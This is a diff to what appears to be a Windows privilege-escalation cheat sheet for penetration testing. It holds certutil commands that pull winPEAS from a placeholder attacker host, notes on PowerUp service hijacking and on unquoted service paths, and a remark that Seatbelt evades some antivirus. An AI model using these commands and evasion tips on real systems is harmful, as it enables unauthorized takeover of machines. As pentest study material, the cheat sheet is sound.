@@ -42,12 +42,14 @@ certutil -urlcache -split -f http://[KALI_IP]/winPEASx64.exe C:\Temp\winpeas.exe
 certutil -urlcache -split -f http://[KALI_IP]/winPEASany.exe C:\Temp\winpeas.exe
 
 C:\Temp\winpeas.exe
-C:\Temp\winpeas.exe > C:\Temp\out.txt 2>&1
+C:\Temp\winpeas.exe > C:\Temp\out.txt 2>NUL
 C:\Temp\winpeas.exe quiet servicesinfo
 C:\Temp\winpeas.exe quiet windowscreds
 ```
 
 ### PowerUp (PowerShell) ⭐
+
+**PowerUp** is a PowerShell script (part of the PowerSploit suite) specifically designed to find **misconfigured Windows Services**. Windows services often run as SYSTEM; if you can hijack one, you inherit its power.
 
 ```powershell
 # Upload PowerUp.ps1 then:
@@ -68,6 +70,11 @@ Find-PathDLLHijack
 ```
 
 ### Seatbelt
+
+While PowerUp focuses on exploiting services, **Seatbelt** (part of the GhostPack suite) is a "Safety Check" tool. It performs **System Enumeration** to give you a massive data dump of the environment.
+
+### Why use Seatbelt?
+It is written in C#, which makes it harder for some antivirus programs to detect than a raw `.ps1` script. It’s less about "How do I get root?" and more about "Where am I, and what is interesting here?"
 
 ```powershell
 # Upload Seatbelt.exe then:
@@ -203,7 +210,7 @@ Get-UnquotedService
 
 # Shortcut — look for spaces in path without quotes:
 # C:\Program Files\Vuln App\service.exe  ← VULNERABLE
-# Will try: C:\Program.exe, C:\Program Files\Vuln.exe first
+# Will try: C:\Program.exe, C:\Program Files\Vuln.exe
 ```
 
 ### Exploit
